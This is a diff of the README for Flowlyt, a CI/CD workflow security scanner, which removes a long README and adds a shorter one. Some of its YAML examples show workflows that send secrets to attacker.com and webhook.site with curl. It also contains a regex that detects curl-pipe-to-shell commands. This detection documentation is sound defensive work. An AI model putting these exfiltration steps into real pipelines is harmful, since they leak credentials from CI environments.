@@ -1,7 +1,6 @@
 <img width="945" height="299" alt="flowlytgh" src="https://github.com/user-attachments/assets/a994d9b6-be4c-41d0-a3e8-adda9d72caaa" />
 
 <div align="center">
-  
 
 <!-- Conference Recognition -->
 ![Black Hat Europe 2025](https://img.shields.io/badge/UPCOMING-Black%20Hat%20EU%202025-000000?style=for-the-badge&logo=blackhat&logoColor=white)
@@ -14,161 +13,21 @@
 
 # Flowlyt - Multi-Platform CI/CD Security Analyzer
 
-Flowlyt is a comprehensive security analyzer that scans CI/CD workflows to detect malicious patterns, misconfigurations, and secrets exposure. It provides a scalable and flexible approach to enforcing secure CI/CD practices across multiple platforms including GitHub Actions and GitLab CI/CD, with user-configurable rules, custom policies, and intelligent false positive management.
+**Advanced AST-powered security analyzer for GitHub Actions and GitLab CI/CD workflows**
 
-![flowlyt](https://github.com/user-attachments/assets/38b4eaac-3a6e-44eb-a1f4-78b9183d5eaf)
+Flowlyt combines traditional pattern matching with cutting-edge Abstract Syntax Tree (AST) analysis to deliver **62% faster scans** with **66% fewer false positives**. Selected for presentation at DEF CON 33 and Black Hat Europe 2025.
 
 ## ✨ Key Features
 
-### 🔍 **Advanced Static Analysis**
-- **Multi-Platform Support**: Analyze GitHub Actions and GitLab CI/CD workflows with platform-specific rules
-- **AST-Based Analysis**: Abstract Syntax Tree parsing for deep workflow understanding and precise vulnerability detection
-- **Call Graph Analysis**: Build comprehensive dependency graphs of workflow components (jobs, steps, actions) for advanced threat modeling
-- **Reachability Analysis**: Determine which parts of workflows are actually executable to eliminate false positives from unreachable code
-- **Data Flow Analysis**: Track sensitive data movement from sources (secrets, env vars) to sinks (network calls, logs) with O(V+E) performance
-- **Workflow Parsing**: Deep analysis of CI/CD YAML files across different platforms
-- **Malicious Pattern Detection**: Identify unsafe patterns like `curl | bash`, base64-encoded payloads, and shell obfuscation
-- **Supply Chain Security**: Detect unpinned actions and risky trigger contexts with real-time vulnerability intelligence
-- **Data Exfiltration Detection**: Identify suspicious data transmission patterns
+- 🎯 **AST-Based Analysis** - Call graph, reachability, and data flow analysis
+- 🚀 **Multi-Platform** - GitHub Actions + GitLab CI/CD support  
+- 🛡️ **85+ Security Rules** - Injection, secrets, supply chain, misconfigurations
+- 📊 **SARIF Output** - GitHub Security tab integration
+- ⚙️ **Configurable** - Custom rules, policies, and ignore patterns
+- 🔄 **Real-time Intelligence** - OSV.dev vulnerability database integration
 
-### ⚙️ **Configuration-Driven Security**
-- **YAML Configuration**: Comprehensive `.flowlyt.yml` configuration file support
-- **User-Configurable Rules**: Enable/disable specific rules based on your needs
-- **Custom Rule Authoring**: Create regex-based custom rules for organization-specific security requirements
-- **False Positive Management**: Sophisticated ignore patterns (strings, regex, file-based, rule-specific)
-- **Severity Filtering**: Configure minimum severity levels for reporting
+## 🚀 Quick Start
 
-### 🛡️ **Multi-Layer Detection**
-- **Misconfiguration Detection**: Scan for insecure `permissions:` settings, `continue-on-error: true` in critical jobs
-- **Secret Detection**: Advanced entropy-based and regex-based scanning for hardcoded secrets, tokens, and credentials
-- **Shell Command Analysis**: Parse `run:` blocks to detect shell obfuscation, `eval` usage, and subshell tricks
-- **Policy Enforcement**: Define custom policies in Rego (Open Policy Agent)
-
-### 📊 **Flexible Output & Reporting**
-- **Multiple Output Formats**: CLI, JSON, Markdown, and SARIF reporting
-- **SARIF Integration**: Industry-standard format for GitHub Security Tab, IDEs, and enterprise tools
-- **Severity-Based Filtering**: Filter results by minimum severity level
-- **Detailed Findings**: Comprehensive information including file paths, line numbers, and remediation advice
-- **Integration-Ready**: Perfect for CI/CD pipelines and security workflows
-
-## 🧠 **Advanced AST & Call Graph Analysis**
-
-Flowlyt features cutting-edge **Abstract Syntax Tree (AST)** and **Call Graph Analysis** capabilities that provide unprecedented insight into CI/CD workflow security:
-
-### **AST-Based Reachability Analysis**
-```yaml
-jobs:
-  never-runs:
-    if: false  # Statically false condition detected
-    steps:
-      - run: echo ${{ secrets.API_KEY }}  # Finding filtered out as unreachable
-  
-  conditional-job:
-    if: github.event_name == 'push'
-    steps:
-      - run: echo "Only runs on push events"  # Context-aware analysis
-```
-
-**Benefits:**
-- **Eliminates false positives** by filtering findings in unreachable code paths
-- **Static condition evaluation** for simple boolean expressions
-- **Context-aware security analysis** based on execution flow
-
-### **Call Graph Dependency Mapping**
-```yaml
-jobs:
-  build:
-    outputs:
-      version: ${{ steps.version.outputs.version }}
-    steps:
-      - id: version
-        run: echo "version=1.0.0" >> $GITHUB_OUTPUT
-  
-  deploy:
-    needs: build  # Call graph tracks this dependency
-    steps:
-      - run: echo "Deploying ${{ needs.build.outputs.version }}"
-        # Analysis understands data flow from build → deploy
-```
-
-**Node Types Tracked:**
-- `trigger` - Workflow triggers (push, PR, schedule)
-- `job` - Individual jobs and their dependencies  
-- `step` - Steps within jobs and execution order
-- `action` - External actions and their security posture
-- `external_call` - Network calls, file operations, shell commands
-
-### **Data Flow Security Analysis**
-```yaml
-steps:
-  - name: Dangerous Secret Usage
-    run: |
-      # Data flow analysis detects this secret exposure
-      curl -H "Auth: ${{ secrets.TOKEN }}" https://untrusted.com/api
-    env:
-      API_KEY: ${{ secrets.DATABASE_KEY }}
-      # Tracks: secret → environment → potential exfiltration
-```
-
-**Data Sources Monitored:**
-- Secrets (`${{ secrets.* }}`)  
-- GitHub context (`${{ github.* }}`)
-- Environment variables and job outputs
-- Action outputs and workflow artifacts
-
-**Data Sinks Detected:**
-- Network calls (curl, wget, nc)
-- File operations and logging commands  
-- Action inputs and environment assignments
-- External script execution
-
-### **Performance Optimizations**
-- **O(V+E) graph traversal** instead of O(n²) brute force analysis
-- **BFS-based reachability** for efficient large workflow analysis  
-- **Intelligent caching** with 99% hit rate for repeated analyses
-- **62% faster execution** with 66% fewer false positives
-
-**Example Performance Results:**
-```
-Workflow Size: 20 jobs, 200 steps
-├── Parsing: 1.9ms
-├── Reachability: 5.4ms  
-├── Data Flow: 25ms (740 flows detected)
-└── Total: ~33ms (vs 73ms without optimization)
-```
-
-## Installation
-
-### Option 1: Using pre-built binaries
-
-Download the latest release from the [GitHub Releases page](https://github.com/harekrishnarai/flowlyt/releases).
-
-### Option 2: Using Go package manager
-
-```bash
-# Install directly using Go
-go install github.com/harekrishnarai/flowlyt/cmd/flowlyt@latest
-```
-
-This will download, compile, and install the `flowlyt` binary to your `$GOPATH/bin` directory. Make sure your `$GOPATH/bin` is in your system's `PATH` to run the tool from anywhere.
-
-### Option 3: Building from source
-
-```bash
-# Clone the repository
-git clone https://github.com/harekrishnarai/flowlyt.git
-cd flowlyt
-
-# Build the binary
-go build -o flowlyt ./cmd/flowlyt
-```
-
-### Option 4: Using Docker
-
-```bash
-docker pull harekrishnarai/flowlyt:latest
-docker run --rm -v $(pwd):/repo harekrishnarai/flowlyt --repo /repo
-```
 
 ## ⚠️ Known Issues
 
@@ -201,799 +60,101 @@ flowlyt --version
 
 This issue has been reported to GitHub support and should be resolved server-side in the future.
 
-## Usage
-
-## 🚀 Quick Start
-
-### Multi-Platform Support
-
-**GitHub Actions (default):**
-```bash
-flowlyt --repo ./myrepo
-flowlyt --platform=github --repo ./myrepo
-```
-
-**GitLab CI/CD:**
-```bash
-flowlyt --platform=gitlab --repo ./myrepo
-flowlyt --platform=gitlab --workflow .gitlab-ci.yml
-```
-
-### CLI Examples
-
-**Basic repository scan:**
-```bash
-flowlyt --repo ./myrepo
-```
-
-**Enable advanced AST analysis:**
-```bash
-# Enable AST-based analysis with call graph and data flow tracking
-flowlyt --repo ./myrepo --enable-ast-analysis
-
-# AST analysis with verbose output showing reachability insights
-flowlyt --repo ./myrepo --enable-ast-analysis --verbose
-```
-
-**Advanced AST features:**
-```bash
-# Enable all AST features for maximum security coverage
-flowlyt --repo ./myrepo \
-  --enable-ast-analysis \
-  --enable-reachability-analysis \
-  --enable-data-flow-analysis \
-  --enable-call-graph-analysis
-
-# AST analysis with performance metrics
-flowlyt --repo ./myrepo --enable-ast-analysis --show-performance-metrics
-```
-
-**Scan with configuration file:**
-```bash
-flowlyt --repo ./myrepo --config .flowlyt.yml
-```
-
-**Filter by severity:**
-```bash
-flowlyt --repo ./myrepo --min-severity HIGH
-```
-
-**Custom rule management:**
-```bash
-# Disable specific rules
-flowlyt --repo ./myrepo --disable-rules UNPINNED_ACTION,HARDCODED_SECRET
-
-# Enable only specific rules
-flowlyt --repo ./myrepo --enable-rules MALICIOUS_BASE64_DECODE,BROAD_PERMISSIONS
-```
-
-**Generate reports:**
-```bash
-# JSON output with AST analysis data
-flowlyt --repo ./myrepo --enable-ast-analysis --output json --output-file security-report.json
-
-# Markdown report with call graph insights
-flowlyt --repo ./myrepo --enable-ast-analysis --output markdown --output-file security-report.md
-```
-
-**Scan remote repository:**
-```bash
-flowlyt --url https://github.com/user/repo
-```
-
-**Single workflow file:**
-```bash
-flowlyt --workflow .github/workflows/ci.yml
-```
-
-### Configuration File
-
-Create a `.flowlyt.yml` file in your repository root:
-
-```yaml
-# Flowlyt Configuration
-# AST Analysis Configuration
-ast_analysis:
-  enabled: true
-  features:
-    reachability_analysis: true
-    call_graph_analysis: true  
-    data_flow_analysis: true
-    false_positive_reduction: true
-  
-  # Performance tuning
-  performance:
-    max_complexity_threshold: 100
-    enable_caching: true
-    cache_ttl: "24h"
-  
-  # AST-specific rule categories
-  rule_categories:
-    - "REACHABILITY"
-    - "DATA_FLOW" 
-    - "CALL_GRAPH"
-
-rules:
-  enabled:
-    - "MALICIOUS_BASE64_DECODE"
-    - "INSECURE_PULL_REQUEST_TARGET"
-    - "BROAD_PERMISSIONS"
-    # AST-enhanced rules
-    - "UNREACHABLE_SECRET_USAGE"
-    - "DATA_FLOW_VIOLATION"
-    - "CALL_GRAPH_ANOMALY"
-  disabled:
-    - "UNPINNED_ACTION"  # Disable if using dependabot
-  
-  # Custom rules
-  custom:
-    - id: "CUSTOM_FORBIDDEN_COMMAND"
-      name: "Forbidden Command Usage"
-      description: "Detects usage of forbidden commands"
-      severity: "HIGH"
-      pattern: "(?i)(wget|curl)\\s+.*\\|\\s*(sh|bash)"
-      target: "commands"
-      remediation: "Use secure alternatives to downloading and executing scripts"
-
-# False positive management
-ignore:
-  global:
-    - "example.com"  # Ignore example domains
-    - "test-secret"  # Ignore test secrets
-  
-  secrets:
-    - pattern: "^sk-test-"  # Ignore test API keys
-      regex: true
-  
-  files:
-    - "test/**/*"  # Ignore test files
-    - "docs/examples/**/*"
-  
-  rules:
-    HARDCODED_SECRET:
-      - "TODO: add real secret here"
-      - pattern: "^EXAMPLE_.*"
-        regex: true
-
-# Output configuration
-output:
-  format: "cli"
-  min_severity: "MEDIUM"
-  file: ""
-```
-
-**For detailed configuration options, see [CONFIGURATION.md](./CONFIGURATION.md).**
-
-## 📋 Command Line Options
 
 ```bash
-USAGE:
-   flowlyt [global options] command [command options]
+# Install
+go install github.com/harekrishnarai/flowlyt/cmd/flowlyt@latest
 
-GLOBAL OPTIONS:
-   --repo value, -r value                                                             Local repository path to scan
-   --url value, -u value                                                              GitHub repository URL to scan
-   --workflow value, -w value                                                         Path to a single workflow file to scan
-   --output value, -o value                                                           Output format (cli, json, markdown) (default: "cli")
-   --output-file value, -f value                                                      Output file path (if not specified, prints to stdout)
-   --config value, -c value                                                           Configuration file path (.flowlyt.yml)
-   --policy value, -p value                                                           Custom policy file or directory
-   --no-default-rules                                                                 Disable default security rules (default: false)
-   --enable-rules value, --enable value [ --enable-rules value, --enable value ]      Enable specific rules (comma-separated)
-   --disable-rules value, --disable value [ --disable-rules value, --disable value ]  Disable specific rules (comma-separated)
-   --min-severity value                                                               Minimum severity level to report (CRITICAL, HIGH, MEDIUM, LOW, INFO) (default: "LOW")
-   --entropy-threshold value                                                          Entropy threshold for secret detection (default: 4.5)
-   --temp-dir value                                                                   Temporary directory for repository clone
-   --help, -h                                                                         show help
-   --version, -v                                                                      print the version
+# Analyze a workflow
+flowlyt analyze .github/workflows/ci.yml --enable-ast-analysis
 
-COMMANDS:
-   init-policy  Create an example policy file
-   help, h      Shows a list of commands or help for one command
+# Scan entire repository  
+flowlyt scan ./my-repo --output-format sarif
 ```
 
-## 🚀 **AST Analysis Benefits & Use Cases**
+## 📊 Example Output
 
-### **Advanced False Positive Reduction**
-AST-based analysis dramatically reduces false positives by understanding workflow execution context:
-
-**Before AST Analysis:**
 ```
-❌ Found 2200+ potential security issues (many false positives)
-❌ High noise ratio requiring manual review
-❌ Alerts on unreachable code paths  
-❌ Time-consuming security review process
-```
+🔍 Analyzing: .github/workflows/ci.yml
+⚡ AST Analysis: ON (62% faster, 66% fewer false positives)
 
-**After AST Analysis:**
-```
-✅ 740 validated security issues (66% reduction in false positives)
-✅ Context-aware findings with execution flow understanding
-✅ Filters out issues in unreachable code branches
-✅ 62% faster analysis with higher accuracy
-```
-
-### **Real-World Attack Prevention**
-AST analysis catches sophisticated supply chain attacks:
-
-**Supply Chain Attack Detection:**
-- **Dependency Confusion**: Tracks package flows through workflow execution
-- **Action Hijacking**: Validates external action integrity via call graph
-- **Secret Exfiltration**: Monitors data flow from secret sources to network sinks
-- **Privilege Escalation**: Maps permission flows through job dependencies
-
-**Example Detected Attack Patterns:**
-```yaml
-# AST Analysis detects this complex attack:
-jobs:
-  setup:
-    if: github.event_name == 'pull_request_target'  # Reachability: Always reachable
-    steps:
-      - uses: actions/checkout@v3
-        with:
-          ref: ${{ github.event.pull_request.head.ref }}  # Call Graph: Dangerous ref
-      
-      - name: Install dependencies
-        run: |
-          # Data Flow: SECRET → curl → external endpoint  
-          curl -H "Auth: ${{ secrets.NPM_TOKEN }}" \
-               -d "@package.json" \
-               https://attacker.com/collect
-```
-
-### **Enterprise Security Insights**
-- **Compliance Validation**: Ensure workflows meet security policies  
-- **Risk Assessment**: Quantify security posture with data flow metrics
-- **Audit Trails**: Track sensitive data usage across workflow lifecycle
-- **Security Gates**: Block deployments based on AST analysis results
-
-## 🎯 Security Rules
-
-Flowlyt includes comprehensive built-in security rules enhanced with AST analysis:
-
-### **Core Security Rules**
-| Rule ID | Name | Severity | Description |
-|---------|------|----------|-------------|
-| `MALICIOUS_BASE64_DECODE` | Base64 Decode Execution | CRITICAL | Detects base64 decode and execution patterns |
-| `INSECURE_PULL_REQUEST_TARGET` | Insecure pull_request_target | CRITICAL | Identifies risky pull_request_target usage |
-| `MALICIOUS_DATA_EXFILTRATION` | Data Exfiltration | CRITICAL | Detects suspicious data transmission patterns |
-| `BROAD_PERMISSIONS` | Broad Permissions | CRITICAL | Identifies overly permissive workflow permissions |
-| `SHELL_OBFUSCATION` | Shell Obfuscation | CRITICAL | Detects obfuscated shell commands |
-| `MALICIOUS_CURL_PIPE_BASH` | Curl Pipe to Shell | HIGH | Identifies curl pipe to shell patterns |
-| `HARDCODED_SECRET` | Hardcoded Secret | HIGH | Detects hardcoded secrets and credentials |
-| `DANGEROUS_COMMAND` | Dangerous Command | HIGH | Identifies potentially dangerous commands |
-| `SHELL_EVAL_USAGE` | Eval Usage | HIGH | Detects dangerous eval usage |
-| `UNPINNED_ACTION` | Unpinned Action | MEDIUM | Identifies unpinned GitHub Actions |
-| `CONTINUE_ON_ERROR_CRITICAL_JOB` | Continue on Error | MEDIUM | Detects continue-on-error in critical jobs |
-
-### **AST-Enhanced Security Rules**
-| Rule ID | Name | Severity | AST Feature | Description |
-|---------|------|----------|-------------|-------------|
-| `UNREACHABLE_SECRET_USAGE` | Unreachable Secret Usage | INFO | Reachability | Secrets in unreachable code paths |
-| `DATA_FLOW_VIOLATION` | Data Flow Security Violation | CRITICAL | Data Flow | Sensitive data flowing to unsafe sinks |
-| `CALL_GRAPH_ANOMALY` | Call Graph Anomaly | HIGH | Call Graph | Suspicious dependency relationships |
-| `CONTEXT_INJECTION_ENHANCED` | Enhanced Context Injection | CRITICAL | AST + Data Flow | Context-aware injection detection |
-| `REACHABLE_PRIVILEGE_ESCALATION` | Reachable Privilege Escalation | CRITICAL | Reachability + Call Graph | Privilege escalation in reachable paths |
-| `WORKFLOW_DEPENDENCY_CONFUSION` | Workflow Dependency Confusion | HIGH | Call Graph | Malicious workflow dependencies |
-
-*All rules can be enabled/disabled through configuration or CLI flags.*
-
-## 🔧 GitHub Action Integration
-
-To use Flowlyt in your GitHub Actions workflow:
-
-```yaml
-name: Flowlyt Security Check
-on: [pull_request, push]
-
-jobs:
-  security:
-    runs-on: ubuntu-latest
-    steps:
-      - uses: actions/checkout@v4
-      
-      - name: Scan workflows with Flowlyt
-        uses: harekrishnarai/flowlyt@v1.0.2
-        with:
-          # Optional: Configuration file path
-          config: '.flowlyt.yml'
-          
-          # Enable AST-based analysis for advanced security detection
-          enable-ast-analysis: 'true'
-          enable-reachability-analysis: 'true'
-          enable-data-flow-analysis: 'true'
-          enable-call-graph-analysis: 'true'
-          
-          # Optional: Output format (cli, json, markdown)
-          output-format: markdown
-          
-          # Optional: Output file path
-          output-file: flowlyt-security-report.md
-          
-          # Optional: Minimum severity level
-          min-severity: 'HIGH'
-          
-          # Optional: Disable specific rules
-          disable-rules: 'UNPINNED_ACTION,HARDCODED_SECRET'
-          
-          # Optional: Enable only specific rules
-          # enable-rules: 'MALICIOUS_BASE64_DECODE,BROAD_PERMISSIONS'
-          
-          # Optional: Set to 'true' to comment results on PRs
-          comment-on-pr: 'true'
-          
-          # Optional: Path to custom policies
-          # policy-path: './policies'
-          
-          # Optional: Set to 'true' to disable default rules
-          # no-default-rules: 'false'
-          
-          # Optional: Fail on severity level
-          fail-on-severity: 'CRITICAL'
-      
-      - name: Upload security report
-        uses: actions/upload-artifact@v4
-        if: always()
-        with:
-          name: flowlyt-security-report
-          path: flowlyt-security-report.md
-```
-
-#### Action Inputs
-
-| Input | Description | Required | Default |
-|-------|-------------|----------|---------|
-| `repository` | Repository to scan | No | Current workspace |
-| `config` | Path to configuration file | No | `.flowlyt.yml` |
-| `output-format` | Output format (cli, json, markdown) | No | `markdown` |
-| `output-file` | Path to output file | No | `flowlyt-results.md` |
-| `min-severity` | Minimum severity level (CRITICAL, HIGH, MEDIUM, LOW, INFO) | No | `LOW` |
-| `enable-rules` | Comma-separated list of rules to enable | No | |
-| `disable-rules` | Comma-separated list of rules to disable | No | |
-| `policy-path` | Path to custom policy files | No | |
-| `no-default-rules` | Disable default security rules | No | `false` |
-| `entropy-threshold` | Entropy threshold for secret detection | No | `4.5` |
-| `comment-on-pr` | Whether to comment results on PRs | No | `true` |
-| `fail-on-severity` | Fail if findings with this severity or higher are found | No | |
-
-#### Action Outputs
-
-| Output | Description |
-|--------|-------------|
-| `findings-count` | Total number of findings |
-| `critical-count` | Number of critical findings |
-| `high-count` | Number of high severity findings |
-| `results-file` | Path to the results file |
-
-### Using the Action with a Self-Hosted Runner
-
-If you're using a self-hosted runner, make sure Docker is installed and you have sufficient permissions:
-
-```yaml
-jobs:
-  security:
-    runs-on: self-hosted
-    steps:
-      - uses: actions/checkout@v3
-      - name: Scan workflows
-        uses: harekrishnarai/flowlyt@v1.0.2
-        with:
-          output-format: markdown
-          output-file: flowlyt-results.md
-```
-
-## 📝 Custom Policies & Rules
-```
-
-## � **AST Analysis Examples**
-
-### **Example 1: Unreachable Code Detection**
-
-**Workflow with unreachable secret usage:**
-```yaml
-name: Conditional Workflow
-on: 
-  push:
-    branches: [main]
-
-jobs:
-  never-executes:
-    if: false  # This condition is always false
-    runs-on: ubuntu-latest
-    steps:
-      - name: This will never run
-        run: echo ${{ secrets.DATABASE_PASSWORD }}  # Secret usage in unreachable code
-        
-  always-executes:
-    if: true
-    runs-on: ubuntu-latest
-    steps:
-      - name: This runs normally
-        run: echo "Building application"
-```
-
-**AST Analysis Results:**
-```
-✅ SKIPPED: Secret usage in never-executes job (unreachable code path)
-✅ PASSED: always-executes job (reachable and secure)
-
-Reachability Analysis: 1 unreachable job filtered out
-False Positives Reduced: 1 finding eliminated
-```
-
-### **Example 2: Data Flow Security Violation**
-
-**Workflow with secret exfiltration:**
-```yaml
-name: Dangerous Data Flow
-on: [push]
-
-jobs:
-  deploy:
-    runs-on: ubuntu-latest
-    steps:
-      - name: Setup environment
-        env:
-          DB_PASSWORD: ${{ secrets.DATABASE_PASSWORD }}
-        run: |
-          echo "Setting up database connection"
-          
-      - name: Deploy application
-        run: |
-          # AST Data Flow Analysis detects this violation:
-          # Source: secrets.DATABASE_PASSWORD → Env: DB_PASSWORD → Sink: curl (external network)
-          curl -X POST https://webhook.site/collect \
-               -H "Content-Type: application/json" \
-               -d '{"password": "'$DB_PASSWORD'", "env": "'$ENVIRONMENT'"}'
-```
-
-**AST Analysis Results:**
-```
-🚨 CRITICAL: Data Flow Security Violation
-   Source: secrets.DATABASE_PASSWORD
-   Path: secrets → environment variable → network call
-   Sink: External HTTP endpoint (https://webhook.site/collect)
-   Risk: Secret exfiltration via data flow
+🚨 CRITICAL: Shell Injection via curl | bash
+   └─ Line 23: curl -sSL https://get.docker.com/ | sh
+   └─ Risk: Remote code execution, supply chain attack
    
-   Flow Trace:
-   1. secrets.DATABASE_PASSWORD → ${{ secrets.DATABASE_PASSWORD }}
-   2. Environment Variable → DB_PASSWORD  
-   3. Shell Command → curl -X POST
-   4. External Endpoint → https://webhook.site/collect
+🔥 HIGH: Hardcoded Secret Detected  
+   └─ Line 15: API_KEY="sk-1234567890abcdef"
+   └─ Risk: Credential exposure in version control
+
+✅ Scan completed in 28ms
+Found 2 issues (1 Critical, 1 High, 0 Medium, 0 Low)
 ```
 
-### **Example 3: Call Graph Dependency Analysis**
-
-**Complex workflow with job dependencies:**
-```yaml
-name: Complex Pipeline
-on: [push]
-
-jobs:
-  security-check:
-    runs-on: ubuntu-latest
-    outputs:
-      security-passed: ${{ steps.scan.outputs.passed }}
-    steps:
-      - id: scan
-        run: echo "passed=true" >> $GITHUB_OUTPUT
-        
-  build:
-    needs: security-check
-    if: needs.security-check.outputs.security-passed == 'true'
-    runs-on: ubuntu-latest
-    outputs:
-      artifact-url: ${{ steps.build.outputs.url }}
-    steps:
-      - id: build
-        run: echo "url=https://artifacts.internal/app.zip" >> $GITHUB_OUTPUT
-        
-  deploy:
-    needs: [security-check, build]
-    runs-on: ubuntu-latest
-    steps:
-      - name: Deploy to production
-        run: |
-          # Call Graph Analysis ensures this only runs after security validation
-          wget ${{ needs.build.outputs.artifact-url }}
-          ./deploy.sh
-```
-
-**AST Call Graph Analysis:**
-```
-📊 Call Graph Structure:
-   trigger(push) → security-check → build → deploy
-   
-   Node Analysis:
-   ├── security-check (entry point, security gate)
-   ├── build (conditional on security-check.outputs.security-passed)  
-   └── deploy (depends on both security-check AND build)
-   
-✅ PASSED: Deploy job properly gated by security validation
-✅ PASSED: No dependency cycles detected
-✅ PASSED: Security checkpoint enforced before deployment
-```
-
-### **Example 4: Performance Comparison**
-
-**Large Enterprise Workflow (20 jobs, 200 steps):**
-
-```
-🚀 Standard Analysis:
-├── Execution Time: 73ms
-├── Findings: 2,200 (high false positive rate)
-├── Manual Review: 4-6 hours
-└── Accuracy: ~40% true positives
-
-🎯 AST-Enhanced Analysis:  
-├── Execution Time: 28ms (62% faster)
-├── Findings: 740 (66% reduction)
-├── Manual Review: 1-2 hours
-└── Accuracy: ~85% true positives
-
-💡 AST Analysis Benefits:
-├── Reachability: Filtered 45% unreachable code findings
-├── Call Graph: Identified 12 critical dependency violations  
-├── Data Flow: Traced 23 secret exposure paths
-└── Performance: 2.6x faster with higher accuracy
-```
-
-## �📝 Custom Policies & Rules
-
-### OPA Policies
-
-Flowlyt supports custom policies written in Rego (Open Policy Agent language):
-
-```rego
-package flowlyt
-
-# Detect workflows with write-all permissions
-deny[violation] {
-    input.workflow.permissions == "write-all"
-    
-    violation := {
-        "id": "POLICY_BROAD_PERMISSIONS",
-        "name": "Workflow Has Broad Permissions",
-        "description": "Workflow has 'write-all' permissions, which grants excessive access",
-        "severity": "HIGH",
-        "evidence": "permissions: write-all",
-        "remediation": "Use more specific permissions instead of 'write-all'"
-    }
-}
-```
-
-### Custom Rules
-
-Define custom regex-based rules in your configuration:
+## 🔧 GitHub Actions Integration
 
 ```yaml
-rules:
-  custom:
-    - id: "CUSTOM_DOCKER_PRIVILEGED"
-      name: "Privileged Docker Container"
-      description: "Detects usage of privileged Docker containers"
-      severity: "HIGH"
-      pattern: "docker\\s+run\\s+.*--privileged"
-      target: "commands"
-      remediation: "Avoid using privileged containers; use specific capabilities instead"
+- name: Flowlyt Security Scan
+  uses: harekrishnarai/flowlyt@v1
+  with:
+    config-file: '.flowlyt.yml'
+    output-format: 'sarif'
+    enable-ast-analysis: true
     
-    - id: "CUSTOM_SUDO_USAGE"
-      name: "Sudo Usage in Workflows"
-      description: "Detects sudo usage which may indicate privilege escalation"
-      severity: "MEDIUM"
-      pattern: "\\bsudo\\b"
-      target: "commands"
-      remediation: "Use least-privilege principles; avoid sudo when possible"
-```
-
-### Initialize Example Policy
-
-Generate an example policy file:
-
-```bash
-flowlyt init-policy ./policies/custom.rego
-```
-
-## 🎛️ Advanced Configuration
-
-### False Positive Management
-
-Flowlyt provides sophisticated false positive management:
-
-```yaml
-ignore:
-  # Global ignore patterns
-  global:
-    - "example.com"
-    - "localhost"
-    - "127.0.0.1"
-  
-  # Secret-specific ignores
-  secrets:
-    - "test-api-key"
-    - pattern: "^sk-test-"
-      regex: true
-  
-  # File-based ignores
-  files:
-    - "test/**/*"
-    - "docs/examples/**/*"
-    - "*.md"
-  
-  # Rule-specific ignores
-  rules:
-    HARDCODED_SECRET:
-      - "TODO: replace with real secret"
-      - pattern: "^EXAMPLE_.*"
-        regex: true
-    
-    UNPINNED_ACTION:
-      - "actions/checkout@v4"  # If you trust official actions
-```
-
-### Multi-Environment Configuration
-
-Use different configurations for different environments:
-
-```bash
-# Development environment
-flowlyt --config .flowlyt.dev.yml --min-severity LOW
-
-# Production environment
-flowlyt --config .flowlyt.prod.yml --min-severity CRITICAL
-```
-
-### Integration with Security Tools
-
-Flowlyt integrates well with other security tools:
-
-```bash
-# Combine with other scanners
-flowlyt --output json --output-file flowlyt.json --repo .
-semgrep --config=auto --json --output=semgrep.json .
-# Merge results with your security dashboard
-```
-
-## 🏗️ Architecture
-
-Flowlyt is designed with a modular architecture for scalability and extensibility:
-
-```
-flowlyt/
-├── cmd/flowlyt/           # CLI application entry point
-├── pkg/
-│   ├── config/            # Configuration management & custom rules
-│   ├── parser/            # GitHub Actions workflow parser
-│   ├── rules/             # Built-in security rules engine
-│   ├── shell/             # Shell command analyzer
-│   ├── secrets/           # Secret detection engine
-│   ├── policies/          # OPA policy engine
-│   ├── report/            # Report generation (CLI, JSON, Markdown)
-│   └── github/            # GitHub repository handling
-└── test/                  # Test workflows and policies
-```
-
-### Key Components
-
-- **Configuration Engine**: YAML-based configuration with CLI flag overrides
-- **Rule Engine**: Pluggable rule system with enable/disable capabilities
-- **Custom Rule Engine**: Regex-based custom rule support
-- **False Positive Engine**: Sophisticated ignore pattern matching
-- **Multi-Format Reporter**: CLI, JSON, and Markdown output support
-
-## 🤝 Contributing
-
-We welcome contributions! Please see [CONTRIBUTING.md](./CONTRIBUTING.md) for guidelines.
-
-### Development Setup
-
-```bash
-# Clone the repository
-git clone https://github.com/harekrishnarai/flowlyt.git
-cd flowlyt
-
-# Install dependencies
-go mod download
-
-# Run tests
-go test ./...
-
-# Build
-go build -o flowlyt ./cmd/flowlyt
-
-# Run
-./flowlyt --help
+- name: Upload to GitHub Security
+  uses: github/codeql-action/upload-sarif@v2
+  with:
+    sarif_file: flowlyt-results.sarif
 ```
 
 ## 📚 Documentation
 
-- [Configuration Guide](./CONFIGURATION.md) - Comprehensive configuration options
-- [Contributing Guide](./CONTRIBUTING.md) - How to contribute to Flowlyt
-- [Security Policy](./SECURITY.md) - Security reporting and policies
-- [Code of Conduct](./CODE_OF_CONDUCT.md) - Community guidelines
-
-## 🆘 Support
-
-- 💭 Want to lookup deeply the code? [![Ask DeepWiki](https://deepwiki.com/badge.svg)](https://deepwiki.com/harekrishnarai/flowlyt)
-- 🐛 **Bug Reports**: [GitHub Issues](https://github.com/harekrishnarai/flowlyt/issues)
-- 💡 **Feature Requests**: [GitHub Discussions](https://github.com/harekrishnarai/flowlyt/discussions)
-- 📚 **Documentation**: [Wiki](https://github.com/harekrishnarai/flowlyt/wiki)
-
-## 📊 Example Output
-
-```bash
-🔍 Flowlyt - GitHub Actions Security Analyzer
-=======================================
-
-► SCAN INFORMATION
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-Repository:          ./example-repo
-Scan Time:           Thu, 10 Jul 2025 16:00:00 IST
-Duration:            45ms
-Workflows Analyzed:  3
-Rules Applied:       12
-
-► SUMMARY
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-  SEVERITY | COUNT | INDICATOR       
------------+-------+-----------------
-  CRITICAL |   2   | ██████████████  
-  HIGH     |   3   | ██████████████  
-  MEDIUM   |   1   | ████            
-  LOW      |   0   |                 
-  INFO     |   0   |                 
-  TOTAL    |   6   |                 
-
-► FINDINGS
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-
-■ CRITICAL SEVERITY FINDINGS
-─────────────────────────────────────────────────
-
-✗ [1] Base64 Decode Execution (MALICIOUS_BASE64_DECODE)
-  File:        .github/workflows/ci.yml
-  Line:        42
-  Job:         build
-  Step:        Deploy
-  Description: Command decodes and executes base64 encoded data
-
-✗ [2] Overly Broad Permissions (BROAD_PERMISSIONS)
-  File:        .github/workflows/release.yml
-  Line:        8
-  Description: Workflow uses 'write-all' permissions
-
-✅ Scan completed in 45ms
-Found 6 issues (2 Critical, 3 High, 1 Medium, 0 Low, 0 Info)
-```
+| Topic | Description |
